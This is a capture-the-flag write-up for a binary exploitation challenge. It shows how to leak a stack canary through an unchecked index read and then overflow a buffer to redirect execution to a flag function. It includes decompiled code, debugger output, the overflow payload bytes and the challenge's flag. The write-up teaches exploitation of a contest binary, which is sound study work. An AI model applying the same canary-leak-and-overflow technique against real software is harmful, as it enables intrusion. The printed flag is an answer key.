# bof2
Pwn

## Challenge 

Defeat the canary protection! P.S. The canary is autogenerated and different everytime! perhaps you need some tools ... pwntools

nc challs.hats.sg 1302

Reading material:

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/ (full)
https://ctf101.org/binary-exploitation/stack-canaries/
http://www.auxy.xyz/tutorial/2018/09/01/Pwntools-Step-By-Step.html (pwntools)

Author: @dickheadedzed

## Hint
That Fibonacci number printer seems suspicious. There's no bounds checking!

The canary is different everytime! Perhaps there is a way to solve this problem ... in an automated fashion. Use pwntools

## Solution

Decompile in Hopper

	int main() {
	    rsp = rsp + 0xffffffffffffff80;
	    rax = 0x0;
	    rax = 0x0;
	    rax = banner();
	    var_70 = 0x0; // var_70: -112
	    var_68 = 0x1; // var_68: -104
	    var_60 = 0x1; // var_60: -96
	    var_58 = 0x2; // var_58: -88
	    var_50 = 0x3; // var_50: -80
	    var_48 = 0x5; // var_48: -72
	    var_40 = 0x8; // var_40: -64
	    var_38 = 0xd; // var_38: -56
	    rax = puts("im the bof fib printer!");
	    rax = puts("gimme index of the number you want me to print:");
	    rax = 0x0;
	    rax = __isoc99_scanf(0x402150, &var_74);
	    rsi = *(rbp + sign_extend_32(var_74) * 0x8 + 0xffffffffffffff90);
	    rax = 0x0;
	    rax = printf(0x402153); // %zu
	    rax = read(0x0, &var_30, 0x100); // var_30: -48
	    rax = 0x0;
	    rax = printf("hey i printed the fib, %s, what do ya want!", &var_30);
	    rax = 0x0;
	    rcx = *0x28 ^ *0x28;
	    if (rcx != 0x0) {
	            rax = __stack_chk_fail();
	    }
	    return rax;
	}

Check getflag() address

	# gdb bof2
	(gdb) break getflag
	Breakpoint 1 at 0x401219

From the decompiled code, we can query an index of the memory before we do our buffer overflow.

The code shows 8x 64-bit values (index 0 through 7) which are constants. Our buffer is at index 8.

	# ./bof2
	*** WELCOME TO bof2.c ***
	im the bof fib printer!
	gimme index of the number you want me to print:
	8
	139825235751584

The buffer is 40 bytes long (ie. offset -48 to offset -8). Hence, it spans for 5 index. Hence the canary is at index 13 (and it is an always changing canary value).

Now we can write our exploit code.

We can query canary at index 13 and then send a payload of 'A'* 40. Apparently, this shows part of the canary being printed and we can confirm we got the right canary values.

	bof2 $ python3 solve.py 
	canary 0x96db6cec7f5d0a00 b'\x96\xdbl\xec\x7f]\n\x00'
	b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
	b' i printed the fib, AAAAAAAAAAAAAAAAAAAAAAAAAAA'
	b'AAAAAAAAAAAAA\n\n]\x7f\xecl\xdb\x96P\x13@, what do ya want!'
	*** stack smashing detected ***: ./bof2 terminated
	*** Connection closed by remote host ***

Now just write the script to include the canary and return value

Get flag

	$ python3 solve.py 
	canary 0x84792f8c422f5800 b'\x84y/\x8cB/X\x00'
	b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00X/B\x8c/y\x84JUNKJUNK\x19\x12@\x00\x00\x00\x00\x00'
	b' i printed the fib, AAAAAAAAAAAAAAAAAAAAAAAAAAA'
	b'AAAAAAAAAAAAA, what do ya want!'

	HINT: you shoudn't jump straight to getflag
	but instead somewhere in the middle

	This is due to the stack alignment shifting (the value of rbp now has a '8' in the units place, which system() does not like)
	HATS{cAnarie_suX_h3h1}

## Flag

	HATS{cAnarie_suX_h3h1}
